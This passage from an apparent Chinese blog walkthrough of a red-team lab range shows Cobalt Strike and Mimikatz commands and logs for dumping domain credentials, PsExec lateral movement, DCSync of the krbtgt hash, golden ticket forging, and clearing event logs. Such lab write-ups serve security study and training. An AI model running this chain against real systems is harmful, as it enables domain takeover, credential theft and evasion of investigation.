+</span></span></code></pre></td></tr></table></div></div><h2 id=凭据抓取与横向移动>凭据抓取与横向移动</h2><h3 id=mimikatz密码抓取>Mimikatz密码抓取</h3><p>回到cs客户端右键STU1计算机名称这条东西选择会话交互，分别执行以下命令</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>sleep 0
+</span></span><span class=line><span class=cl>getuid
+</span></span><span class=line><span class=cl>logonpasswords
+</span></span></code></pre></td></tr></table></div></div><p>CS常用命令</p><div class=table-wrapper><table><thead><tr><th style=text-align:left>命令</th><th style=text-align:left>作用</th></tr></thead><tbody><tr><td style=text-align:left><code>sleep 0</code></td><td style=text-align:left>设置实时交互（无延迟）</td></tr><tr><td style=text-align:left><code>getuid</code></td><td style=text-align:left>获取当前用户</td></tr><tr><td style=text-align:left><code>logonpasswords</code></td><td style=text-align:left>抓取内存中的密码/Hash</td></tr><tr><td style=text-align:left><code>hashdump</code></td><td style=text-align:left>抓取本地账户 Hash</td></tr><tr><td style=text-align:left><code>shell ipconfig</code></td><td style=text-align:left>执行系统命令（加 <code>shell</code> 前缀）</td></tr><tr><td style=text-align:left><code>shell whoami</code></td><td style=text-align:left>执行系统命令</td></tr></tbody></table></div><h4 id=等命令执行完毕然后总结获取的信息>等命令执行完毕，然后总结获取的信息</h4><div class=table-wrapper><table><thead><tr><th style=text-align:left>项目</th><th style=text-align:left>值</th></tr></thead><tbody><tr><td style=text-align:left><strong>用户名</strong></td><td style=text-align:left>Administrator</td></tr><tr><td style=text-align:left><strong>域名</strong></td><td style=text-align:left>GOD</td></tr><tr><td style=text-align:left><strong>明文密码</strong></td><td style=text-align:left><code>hongrisec@2026</code></td></tr><tr><td style=text-align:left><strong>NTLM Hash</strong></td><td style=text-align:left><code>794adae2ad271e3a7bba23288c7d4702</code></td></tr><tr><td style=text-align:left><strong>LM Hash</strong></td><td style=text-align:left><code>edea194d76c77d872f1c9569f45410d9</code></td></tr><tr><td style=text-align:left><strong>SHA1</strong></td><td style=text-align:left><code>cd32ab2e790d52e598d932991e35edc1f8a53b5b</code></td></tr><tr><td style=text-align:left><strong>登录服务器</strong></td><td style=text-align:left>OWA（域控）</td></tr></tbody></table></div><h4 id=机器账户凭证>机器账户凭证</h4><div class=table-wrapper><table><thead><tr><th style=text-align:left>项目</th><th style=text-align:left>值</th></tr></thead><tbody><tr><td style=text-align:left><strong>用户名</strong></td><td style=text-align:left>STU1$</td></tr><tr><td style=text-align:left><strong>域名</strong></td><td style=text-align:left>GOD</td></tr><tr><td style=text-align:left><strong>NTLM Hash</strong></td><td style=text-align:left><code>772a1fdd43040a02235f9aeecd7b2e32</code></td></tr></tbody></table></div><h4 id=关键总结>关键总结</h4><ol><li><strong>域管理员明文密码</strong>：<code>hongrisec@2026</code></li><li><strong>域控是 OWA</strong>（登录服务器确认）</li><li>有 NTLM Hash，可以用于 <strong>Pass-the-Hash</strong> 攻击</li></ol><h3 id=横向移动到域控>横向移动到域控</h3><p>利用抓取的凭据，通过 <strong>PsExec</strong> 横向移动到 <code>192.168.52.138</code>（OWA 域控）。</p><p>在 CS 中执行：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>[07/22 02:13:25] beacon<span class=p>&gt;</span> jump psexec 192.168.52.138 win7
+</span></span><span class=line><span class=cl>[07/22 02:13:26] [*] Tasked beacon to run windows/beacon_http/reverse_http (10.10.10.10:4444) on 192.168.52.138 via Service Control Manager (\\192.168.52.138\ADMIN$\6d6c11e.exe)
+</span></span><span class=line><span class=cl>[07/22 02:13:26] [+] host called home, sent: 294174 bytes
+</span></span></code></pre></td></tr></table></div></div><p>但是没有出现域控主机</p><p>没关系</p><h4 id=创建-smb-beacon-并横向移动>创建 SMB Beacon 并横向移动</h4><p>问题是</p><p>jump psexec 192.168.52.138 win7 使用了 HTTP Beacon，但域控在内网，无法直接访问外网的 <code>10.10.10.10:4444</code>。</p><p>HTTP Beacon 需要目标能直接连接 Teamserver，而 SMB Beacon 通过命名管道在已有 Beacon 上通信，不需要域控出网。</p><p>新建一块监听器，</p><p><img class=gallery-image data-flex-basis=175px data-flex-grow=72 height=624 loading=lazy sizes="(max-width: 767px) calc(100vw - 30px), (max-width: 1023px) 700px, (max-width: 1279px) 950px, 1232px" src=/p/%E7%BA%A2%E6%97%A5attck%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%E4%B8%80/%E7%BA%A2%E6%97%A5%E7%BA%A2%E9%98%9FATT%EF%BC%86CK%E7%B3%BB%E5%88%97%E9%9D%B6%E5%9C%BA%EF%BC%88%E4%B8%80%EF%BC%89-20260722032345992.png width=455></p><p>在 STU1 的 Beacon 中执行</p><p>jump psexec 192.168.52.138 smb</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>[07/22 02:21:48] beacon<span class=p>&gt;</span> jump psexec 192.168.52.138 smb
+</span></span><span class=line><span class=cl>[07/22 02:21:48] [*] Tasked beacon to run windows/beacon_bind_pipe (\\.\pipe\msagent_14) on 192.168.52.138 via Service Control Manager (\\192.168.52.138\ADMIN$\7338317.exe)
+</span></span><span class=line><span class=cl>[07/22 02:21:48] [+] host called home, sent: 294227 bytes
+</span></span><span class=line><span class=cl>[07/22 02:21:51] [+] received output:
+</span></span><span class=line><span class=cl>Started service 7338317 on 192.168.52.138
+</span></span><span class=line><span class=cl>[07/22 02:21:51] [+] established link to child beacon: 192.168.52.138
+</span></span></code></pre></td></tr></table></div></div><p>事件日志 多了一行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>07/22 02:21:51 *** initial beacon from SYSTEM *@192.168.52.138 (OWA)
+</span></span></code></pre></td></tr></table></div></div><h4 id=成功上线域控-owa权限system>成功上线域控 OWA，权限：SYSTEM</h4><p>结果：</p><ul><li>主机：OWA (192.168.52.138)</li><li>权限：NT AUTHORITY\SYSTEM</li></ul><h4 id=域控权限获取>域控权限获取</h4><div class=table-wrapper><table><thead><tr><th style=text-align:left>项目</th><th style=text-align:left>STU1 (Win7)</th><th style=text-align:left>OWA (域控)</th></tr></thead><tbody><tr><td style=text-align:left><strong>外网IP</strong></td><td style=text-align:left><code>10.10.10.133</code></td><td style=text-align:left><code>169.254.129.186</code>（显示问题）</td></tr><tr><td style=text-align:left><strong>内网IP</strong></td><td style=text-align:left><code>169.254.129.186</code></td><td style=text-align:left><code>192.168.52.138</code> ✅</td></tr><tr><td style=text-align:left><strong>用户</strong></td><td style=text-align:left><code>Administrator *</code></td><td style=text-align:left><code>SYSTEM *</code> ✅</td></tr><tr><td style=text-align:left><strong>计算机名</strong></td><td style=text-align:left><code>STU1</code></td><td style=text-align:left><code>OWA</code> ✅</td></tr><tr><td style=text-align:left><strong>进程</strong></td><td style=text-align:left><code>artifact.exe</code></td><td style=text-align:left><code>rundll32.exe</code></td></tr><tr><td style=text-align:left><strong>PID</strong></td><td style=text-align:left><code>3428</code></td><td style=text-align:left><code>2440</code></td></tr><tr><td style=text-align:left><strong>权限</strong></td><td style=text-align:left>域管理员</td><td style=text-align:left><strong>SYSTEM</strong> ✅</td></tr><tr><td style=text-align:left><strong>Parent</strong></td><td style=text-align:left>-</td><td style=text-align:left><code>3428</code>（STU1 的 PID）</td></tr></tbody></table></div><h3 id=抓取-krbtgt-hash-制作黄金票据>抓取 krbtgt Hash 制作黄金票据</h3><h4 id=在-owa-的-beacon-中执行>在 OWA 的 Beacon 中执行</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>sleep 0
+</span></span><span class=line><span class=cl>logonpasswords
+</span></span></code></pre></td></tr></table></div></div><p>对获取的信息进行分析</p><p>抓取到的是：</p><ul><li><code>liukaifeng01</code>（域用户，密码 <code>hongrisec@2026</code>）</li><li><code>OWA$</code>（机器账户）</li><li><code>IUSR</code>、<code>LOCAL SERVICE</code>（系统账户）
+缺少 <code>krbtgt</code> 账户，这是制作黄金票据必需的。</li></ul><p>继续执行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>dcsync GOD.ORG krbtgt
+</span></span></code></pre></td></tr></table></div></div><p>对输出再次分析</p><div class=table-wrapper><table><thead><tr><th style=text-align:left>项目</th><th style=text-align:left>值</th></tr></thead><tbody><tr><td style=text-align:left><strong>用户名</strong></td><td style=text-align:left>krbtgt</td></tr><tr><td style=text-align:left><strong>域名</strong></td><td style=text-align:left>GOD.ORG</td></tr><tr><td style=text-align:left><strong>DC 服务器</strong></td><td style=text-align:left>owa.god.org</td></tr><tr><td style=text-align:left><strong>Object SID</strong></td><td style=text-align:left>S-1-5-21-2952760202-1353902439-2381784089-502</td></tr><tr><td style=text-align:left><strong>NTLM Hash</strong></td><td style=text-align:left><code>58e91a5ac358d86513ab224312314061</code></td></tr><tr><td style=text-align:left><strong>LM Hash</strong></td><td style=text-align:left><code>a151f0fbafab56da67864278a60a75e8</code></td></tr><tr><td style=text-align:left><strong>aes256_hmac</strong></td><td style=text-align:left><code>a780c2c18b3287e3448562a36dccb2d57d11fd398b55ce2cd9b128308cef74df</code></td></tr><tr><td style=text-align:left><strong>aes128_hmac</strong></td><td style=text-align:left><code>2e35721544960f553afcba54252d7b13</code></td></tr></tbody></table></div><h4 id=制作黄金票据>制作黄金票据</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>mimikatz kerberos::golden /domain:god.org /sid:S-1-5-21-2952760202-1353902439-2381784089 /krbtgt:58e91a5ac358d86513ab224312314061 /user:Administrator /ptt
+</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>User      : Administrator
+</span></span><span class=line><span class=cl>Domain    : god.org (GOD)
+</span></span><span class=line><span class=cl>SID       : S-1-5-21-2952760202-1353902439-2381784089
+</span></span><span class=line><span class=cl>User Id   : 500
+</span></span><span class=line><span class=cl>Groups Id : *513 512 520 518 519 
+</span></span><span class=line><span class=cl>ServiceKey: 58e91a5ac358d86513ab224312314061 - rc4_hmac_nt      
+</span></span><span class=line><span class=cl>Lifetime  : 2026/7/22 2:38:07 ; 2036/7/19 2:38:07 ; 2036/7/19 2:38:07
+</span></span><span class=line><span class=cl>-<span class=p>&gt;</span> Ticket : golden.kirbi
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl> * PAC generated
+</span></span><span class=line><span class=cl> * PAC signed
+</span></span><span class=line><span class=cl> * EncTicketPart generated
+</span></span><span class=line><span class=cl> * EncTicketPart encrypted
+</span></span><span class=line><span class=cl> * KrbCred generated
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Final Ticket Saved to file !
+</span></span></code></pre></td></tr></table></div></div><p>对票据进行分析</p><div class=table-wrapper><table><thead><tr><th style=text-align:left>项目</th><th style=text-align:left>值</th></tr></thead><tbody><tr><td style=text-align:left><strong>用户</strong></td><td style=text-align:left>Administrator</td></tr><tr><td style=text-align:left><strong>域名</strong></td><td style=text-align:left>god.org (GOD)</td></tr><tr><td style=text-align:left><strong>SID</strong></td><td style=text-align:left>S-1-5-21-2952760202-1353902439-2381784089</td></tr><tr><td style=text-align:left><strong>User ID</strong></td><td style=text-align:left>500（域管理员 RID）</td></tr><tr><td style=text-align:left><strong>Groups ID</strong></td><td style=text-align:left>513 512 520 518 519（域管理员组）</td></tr><tr><td style=text-align:left><strong>ServiceKey</strong></td><td style=text-align:left>58e91a5ac358d86513ab224312314061</td></tr><tr><td style=text-align:left><strong>有效期</strong></td><td style=text-align:left>2026/7/22 → 2036/7/19（10年）</td></tr><tr><td style=text-align:left><strong>票据文件</strong></td><td style=text-align:left>golden.kirbi</td></tr><tr><td style=text-align:left><strong>状态</strong></td><td style=text-align:left>✅ Final Ticket Saved to file</td></tr></tbody></table></div><h2 id=使用黄金票据横向移动>使用黄金票据横向移动</h2><h3 id=先注入票据到内存>先注入票据到内存</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>mimikatz kerberos::ptt golden.kirbi
+</span></span></code></pre></td></tr></table></div></div><p>注入成功</p><h3 id=然后横向移动到最后一台机器>然后横向移动到最后一台机器</h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>jump psexec 192.168.52.141 smb
+</span></span></code></pre></td></tr></table></div></div><p>established link to child beacon: 192.168.52.141 连接成功</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>[07/22 02:46:50] [+] established link to parent beacon: 192.168.52.138
+</span></span><span class=line><span class=cl>[07/22 02:48:34] beacon<span class=p>&gt;</span> sleep 0
+</span></span><span class=line><span class=cl>[07/22 02:48:34] [*] Tasked beacon to become interactive [change made to: Beacon 169.254.129.186@3428]
+</span></span><span class=line><span class=cl>[07/22 02:48:49] beacon<span class=p>&gt;</span> getuid
+</span></span><span class=line><span class=cl>[07/22 02:48:49] [*] Tasked beacon to get userid
+</span></span><span class=line><span class=cl>[07/22 02:48:49] [+] host called home, sent: 8 bytes
+</span></span><span class=line><span class=cl>[07/22 02:48:49] [*] You are NT AUTHORITY\SYSTEM (admin)
+</span></span></code></pre></td></tr></table></div></div><p>三台主机均上线了</p><div class=table-wrapper><table><thead><tr><th style=text-align:left>主机</th><th style=text-align:left>IP</th><th style=text-align:left>权限</th></tr></thead><tbody><tr><td style=text-align:left><strong>STU1</strong> (Win7)</td><td style=text-align:left>10.10.10.133 / 192.168.52.143</td><td style=text-align:left>GOD\Administrator</td></tr><tr><td style=text-align:left><strong>OWA</strong> (域控)</td><td style=text-align:left>192.168.52.138</td><td style=text-align:left>SYSTEM</td></tr><tr><td style=text-align:left><strong>ROOT-TVI862UBEH</strong> (域成员)</td><td style=text-align:left>192.168.52.141</td><td style=text-align:left>SYSTEM</td></tr></tbody></table></div><h2 id=痕迹清除>痕迹清除</h2><p>渗透完成，黄金票据也拿到了，该清除痕迹了</p><ol><li>清除上传的木马</li></ol><p>在蚁剑中删除log.php</p><ol start=2><li>清除日志</li></ol><p>在每个机器的终端执行以下操作</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>shell wevtutil cl System
+</span></span><span class=line><span class=cl>shell wevtutil cl Security
+</span></span><span class=line><span class=cl>shell wevtutil cl Application
+</span></span><span class=line><span class=cl>shell wevtutil cl Setup
+</span></span></code></pre></td></tr></table></div></div><p>然后再删去.exe可执行文件</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-cmd data-lang=cmd><span class=line><span class=cl>[07/22 03:00:29] beacon<span class=p>&gt;</span> shell taskkill /f /im artifact.exe <span class=p>&amp;&amp;</span> <span class=k>del</span> /f /q C:\phpStudy\WWW\artifact.exe
+</span></span><span class=line><span class=cl>[07/22 03:00:29] [*] Tasked beacon to run: taskkill /f /im artifact.exe <span class=p>&amp;&amp;</span> <span class=k>del</span> /f /q C:\phpStudy\WWW\artifact.exe
+</span></span><span class=line><span class=cl>[07/22 03:00:29] [+] host called home, sent: 161 bytes
+</span></span></code></pre></td></tr></table></div></div></section><footer class="article-meta article-footer"><section class=article-tags><a href=/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/>域渗透</a></section><section class="article-copyright inline-meta"><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><footer class=site-footer><section class=copyright>&copy;
+2026 Ke1thLi 的技术笔记</section><section class=powerby><br></section></footer><script type=module>
+    import gallery from '\/ts\/gallery.js';
+
+    const articleContent = document.querySelector('.article-content');
+    const shouldLoad = articleContent && (articleContent.querySelectorAll('figure').length > 0 || articleContent.querySelectorAll('img.gallery-image').length > 0);
+    
+    if (shouldLoad) {
+        gallery(articleContent);
+
+        const PhotoSwipeLightbox = (await import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe-lightbox.esm.min.js")).default;
+        const styleHref = "https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.css";
+
+        const styleTag = document.createElement('link');
+        styleTag.rel = 'stylesheet';
+        styleTag.href = styleHref;
+        document.head.appendChild(styleTag);
+
+        const lightbox = new PhotoSwipeLightbox({
+            gallerySelector: '.article-content',
+            childSelector: 'figure a.image-link',
+            pswpModule: () => import("https:\/\/cdn.jsdelivr.net\/npm\/photoswipe@5.4.4\/dist\/photoswipe.esm.min.js")
+        });
+        lightbox.init();
+    }
+</script></main></div><script type=text/javascript src=/ts/main.acaf849f2b273f6a8368a58b001f336738d0c948d92e79b116467d0c7515f932.js defer></script></body></html>
